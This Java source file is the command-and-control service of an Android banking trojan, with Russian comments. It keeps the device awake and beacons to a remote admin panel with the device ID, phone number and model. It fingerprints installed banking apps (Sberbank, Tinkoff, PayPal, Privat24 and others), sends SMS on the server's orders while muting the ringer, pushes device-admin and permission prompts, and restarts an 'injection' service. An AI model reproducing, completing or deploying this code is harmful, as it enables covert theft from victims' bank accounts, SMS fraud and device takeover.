package com.example.livemusay.myapplication;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;

import static android.os.PowerManager.PARTIAL_WAKE_LOCK;


public class StartWhile extends IntentService
{
    constants const_ = new constants();
    Context context;
    public StartWhile() {
        super("myname");
    }

    public void onCreate() {super.onCreate();}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        return START_STICKY;
    }
    @Override
    protected void onHandleIntent(Intent intent)
    {
        context = this;
        readCommand();//Вызываем главную функцию цикла
    }

    public void readCommand()
    {
        while (true)//наш цикл
        {
            try {TimeUnit.SECONDS.sleep(3);} catch (InterruptedException e) {e.printStackTrace();}

            //не даем устройству уйти в спячку
            PowerManager mPowerManager = (PowerManager) this.getSystemService(POWER_SERVICE);
            PowerManager.WakeLock mWakeLock = mPowerManager.newWakeLock(PARTIAL_WAKE_LOCK, "Service");
            if (mWakeLock != null) {
                mWakeLock.acquire();
                //Запущен WakeLock
            }

            request setPost = new request();
            secFunctions SF = new secFunctions();

            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

            // получаем IMEI и номера
            String IMEI = "";
            String number = "";
            String number_ = "";

            if (Build.VERSION.SDK_INT < 23) {
                IMEI = tm.getDeviceId();
                number = "(" + tm.getNetworkOperatorName() + ")" + tm.getLine1Number();
            } else {
                IMEI = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

                if (IMEI == "") {
                    IMEI = "35" + // 35
                            Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
                            Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +
                            Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +
                            Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +
                            Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                            Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                            Build.USER.length() % 10;
                }
                number = "(NO)"; //(NO)
                number_ = "Indefined"; //Indefined
            }
            String device = android.os.Build.VERSION.RELEASE;  // ОС
            String model = android.os.Build.MODEL + " (" + android.os.Build.PRODUCT + ")";  // модель
            String country = tm.getNetworkCountryIso();  // страна

            String b_nk = "";

            //************проверка root прав**********
            String r0_int="0";
            DevicePolicyManager deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(context, DAdm.class);

            if (!deviceManager.isAdminActive(componentName)) {
                r0_int = "0";
            }else{
                r0_int = "1";
            }

            //*************Проверка состояние экрана*******
            KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
            boolean locked = km.inKeyguardRestrictedInputMode();
            String screen_int="0";
            if (locked == true)
            {
                screen_int = "0";
                Log.e("222", "off");
            } else {
                screen_int = "1";
                Log.e("222", "on");
            }
            //***************Стучимся в АДминику
            Log.e("post", "tuk_p=" + SF.trafEnCr(IMEI+":"+r0_int+":"+screen_int));
            String responce = setPost.go_post(const_.url + "/private/tuk_tuk.php", "p=" + SF.trafEnCr(IMEI+":"+r0_int+":"+screen_int));
            responce = SF.trafDeCr(responce);

            Log.e("Запрос", " - > " + responce);
            //Если приходит |NO|, то регистрируем бот в админке,
            //иначе в случае присутвии команд в бд mysql получаем их!
            if (responce.contains("|NO|") == true) {
                b_nk = get$holder();
                System.out.println("Регаем");
                System.out.println("set_data_p=" + SF.trafEnCr(" " + IMEI + ":" + number + number_ + ":" + device + ":" + country + ":" + b_nk + ":" + model));
                responce = setPost.go_post(const_.url + "/private/set_data.php", "p=" + SF.trafEnCr(IMEI + ":" + number + number_
                        + ":" + device + ":" + country + ":" + b_nk + ":" + model + ":" + const_.Version));

                responce = SF.trafDeCr(responce);
            }else if(responce.contains("state1letsgotxt") == true)
            {
                String resp_settings = setPost.go_post(const_.url + "/private/settings.php", "p=" + SF.trafEnCr(IMEI));
                resp_settings = SF.trafDeCr(resp_settings);
                Log.e("Настройки",""+resp_settings);

                try
                {
                    String mystring = resp_settings;
                    FileOutputStream fos = openFileOutput("setting", Context.MODE_PRIVATE);
                    fos.write(mystring.getBytes());
                    fos.close();
                    Log.e("Настройки","Запись удалась успешна!");
                } catch (IOException ioe)
                {
                    Log.e("Настройки","Запись не удалась!");
                }
            }

            Log.e("Запрос", " - > " + responce);
            String parts[] = responce.split("::");

            //получаем все команды и выполняем их!
            for (int j = 0; j < parts.length; j++) {

                if (parts[j].contains("Send SMS") == true) //отправляем смс
                {
                    //получаем номер и текст для отправки
                    String number$ = SF.return_plain_text(parts[j], "|number=", "|text=");
                    String[] text$ = parts[j].split("text=");

                    try
                    {
                        //Отправляем СМС
                        SmsManager.getDefault().sendTextMessage(number$, null, text$[1], null, null);
                        setPost.go_post(const_.url + "/private/add_log.php", "p=" + SF.trafEnCr(IMEI + "|(Исх) " + "СМС на номер {" + number$ + "}с текстом  {" + text$[1] + "} отправлено!|"));
                        System.out.println("Отправляем смс на номер " + number$ + " с текстом  " + text$[1]);
                        //Глушим звук смс на свякий случай!
                        AudioManager audm;
                        audm = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
                        audm.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                    }
                    catch (Exception ex)
                    {
                        //если смс не удалось отправить оповещаем в адмиеку и запускаем разрешения для отправки смс
                        setPost.go_post(const_.url + "/private/add_log.php", "p=" + SF.trafEnCr(IMEI + "|(Исх) " + "Ошибка с отправкой СМС, возможно нет прав для отправки!|"));
                        System.out.println(IMEI + ": " + "Ошибка отправки СМС, возможно нет прав для отправки!");
                        //Запускаем подтверждения смски
                        Intent dialogIntent = new Intent(StartWhile.this, Press.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(dialogIntent);

                        AudioManager audm;//Глушим звук смс!
                        audm = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
                        audm.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                    }
                }
                if (parts[j].contains("Go_P00t_request") == true) //старт админ прав
                {
                    Intent dialogIntent = new Intent(StartWhile.this, goR00t.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(dialogIntent);
                }
                if (parts[j].contains("Go_startPermis_request") == true) //разрешение геолокации
                {
                    Intent dialogIntent = new Intent(StartWhile.this, Press.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(dialogIntent);
                }

                if(isMyServiceRunning(injectionService.class)==false){//Проверяем состояние сервиса инжектов
                    //запускаем сервис если выкл
                    context.startService(new Intent(context, injectionService.class));
                    Log.e("СТАРТ СЕРВИС","inj");
                }

                AlarmManager localObject = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                PendingIntent localPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(context, AlarM.class), 0);
                ((AlarmManager) localObject).setRepeating(localObject.RTC_WAKEUP, System.currentTimeMillis(), 4000, localPendingIntent);
            }
            try {TimeUnit.SECONDS.sleep(5);} catch (InterruptedException e) {e.printStackTrace();}
        }
    }


    public String get$holder(){
        Log.d("INVISIBLE-LOG","SEARCH BANK CLIENT'S");
        String banC = "";
        int S = 0;
        int A = 0;
        int Q = 0;
        int R_C = 0;
        int tin = 0;
        int pay = 0;
        int wm = 0;
        int ros = 0;
        int mts_b = 0;
        int vtb24 = 0;
        int yan_d = 0;
        int sber_ua = 0;
        int priv24 = 0;
        int rus_stand = 0;
        int ub = 0;
        int id_b = 0;
        int iko = 0;
        int ban_s = 0;
        int otpsmart = 0;

        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo packageInfo : packages) {

            // SBERBANK STANDART
            if(packageInfo.packageName.equals("ru.sberbankmobile")){
                S = 1;
            }
            // SBERBANK BUSSINES
            if(packageInfo.packageName.equals("ru.sberbank_sbbol")){
                S = 1;
            }

            // ALFABANK STANDART
            if(packageInfo.packageName.equals("ru.alfabank.mobile.android")){
                A = 1;
            }
            // ALFABANK BUSSINES
            if(packageInfo.packageName.equals("ru.alfabank.oavdo.amc")){
                A = 1;
            }
            // QIWI
            if(packageInfo.packageName.equals("ru.mw")){
                Q = 1;
            }

            //  R-CONNECT
            if(packageInfo.packageName.equals("ru.raiffeisennews")){
                R_C = 1;
            }
            //  tinkoff
            if(packageInfo.packageName.equals("com.idamob.tinkoff.android")){
                tin  = 1;
            }
            //  paypal
            if(packageInfo.packageName.equals("com.paypal.android.p2pmobile")){
                pay = 1;
            }
            //  webmoney
            if(packageInfo.packageName.equals("com.webmoney.my")){
                //Log.d("INVISIBLE-LOG","QIWI");
                wm  = 1;
            }
            //  РОСТБАНК
            if(packageInfo.packageName.equals("ru.rosbank.android")){
                ros = 1;
            }
            //  ВТБ24
            if(packageInfo.packageName.equals("ru.vtb24.mobilebanking.android")){
                vtb24 = 1;
            }
            //  mts bank
            if(packageInfo.packageName.equals("ru.simpls.mbrd.ui")){
                mts_b = 1;
            }
            // yandex money
            if(packageInfo.packageName.equals("ru.yandex.money")){
                yan_d = 1;
            }
            //  СБЕРБАНК УКРОИНА
            if(packageInfo.packageName.equals("ua.com.cs.ifobs.mobile.android.sbrf")){
                sber_ua = 1;
            }
            //  ПРИВАТ24
            if(packageInfo.packageName.equals("ua.privatbank.ap24")){
                priv24 = 1;
            }
            //  Русский стандарт
            if(packageInfo.packageName.equals("ru.simpls.brs2.mobbank")){
                rus_stand = 1;
            }
            //  ubank
            if(packageInfo.packageName.equals("com.ubanksu")){
                ub = 1;
            }
            //  idea bank
            if(packageInfo.packageName.equals("com.alseda.ideabank")){
                id_b = 1;
            }
            //  iko
            if(packageInfo.packageName.equals("pl.pkobp.iko")){
                iko = 1;
            }
            //  bank sms
            if(packageInfo.packageName.equals("com.bank.sms")){
                ban_s = 1;
            }
            //  otp smart
            if(packageInfo.packageName.equals("ua.com.cs.ifobs.mobile.android.otp")){
                otpsmart = 1;
            }
        }

        if(S == 1)  banC+="|SberB_RU|";
        if(A  == 1)  banC+="|AlfaB_RU|";
        if(Q  == 1)  banC+="|QIWI|";
        if(R_C == 1)  banC+="|R-CONNECT|";
        if(tin  == 1)  banC+="|Tinkoff|";
        if(pay  == 1)  banC+="|paypal|";
        if(wm  == 1)  banC+="|webmoney|";
        if(ros  == 1)  banC+="|RosBank|";
        if(mts_b == 1)  banC+="|MTS BANK|";
        if(vtb24  == 1)  banC+="|VTB24|";
        if(yan_d  == 1)  banC+="|Yandex Bank|";
        if(sber_ua  == 1)  banC+="|SberB_UA|";
        if(priv24  == 1)  banC+="|Privat24|";
        if(rus_stand  == 1)  banC+="|RussStandart|";
        if(ub  == 1)  banC+="|UBank|";
        if(id_b  == 1)  banC+="|Idea_Bank|";
        if(iko  == 1)  banC+="|Iko_Bank|";
        if(ban_s == 1)  banC+="|Bank_SMS|";
        if(otpsmart  == 1)  banC+="|OTP Smart|";

        if((S==0)&&(A==0)&&(Q==0)) banC="no";
        banC = banC.replace("||","|\n|");
        banC = banC.replace("||","|");
        return banC;
    }
    //Проверка состояние сервиса
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
